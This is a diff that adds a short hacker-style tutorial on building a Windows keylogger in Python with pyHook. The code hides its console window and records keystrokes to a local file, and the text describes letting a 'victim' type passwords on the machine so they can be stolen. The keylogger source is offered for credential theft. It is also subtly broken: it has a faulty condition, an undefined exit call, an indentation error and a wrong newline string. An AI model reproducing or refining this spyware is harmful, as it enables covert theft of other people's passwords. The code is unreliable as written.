@@ -1,0 +1,59 @@
+Keylogging
+
+Keylogging is a technicque to record the keys from the key board.Nobody understands the beauty of this other than a hacker.All the passwords to any websites any social networking site they have to be typed in on your keyboard.Voila a perfect recipe to steal passwords.
+In this tutorial you are going to need some basic knowledge on pyhton ( a coding language ) .Every hacker loves python . The reason being its flexibility and its features. You can learn basic python in about 12 hours.It is simple to learn as well
+we are going to need
+->python 2.x
+->pywin32
+->pyhook
+
+You need to download python on your computer.pywin32 and pyhook are the modules in python.You can watch the tutorial on Youtube and refer google.
+after downloading python and after gaining some basic knowledge about this language.Open a text editor and type the following code.
+
+
+import win32api
+import win32console
+import win32gui
+import pythoncom, pyHook
+
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+
+def OnKeyboardEvent(event):
+    if event.Ascii==5:
+        _exit(1)
+    if event.Ascii !=0 or 8:
+        f = open('c:\log.txt', 'r+')
+        buffer = f.read()
+        f.close()
+        f = open('c:\log.txt', 'w')
+        keylogs = chr(event.Ascii)
+        if event.Ascii == 13:
+        keylogs = '/n'
+        buffer += keylogs
+        f.write(buffer)
+        f.close()
+dg = pyHook.HookManager()
+dg.KeyDown = OnKeyboardEvent
+dg.HookKeyboard()
+pythoncom.PumpMessages()
+
+
+And save it as something.py
+
+Next step is to run the program on your computer and let the victim use your computer.Open a browser and tell your victim to use .When ever your victim presses any key on the keyboard that key gets saved in text file.
+For example if i was the victim and my password was hacktorial.Then the log.txt would have something like.
+
+h
+a
+c
+k
+t
+o
+r
+i
+a
+l
+return
+
+And voila you have my password
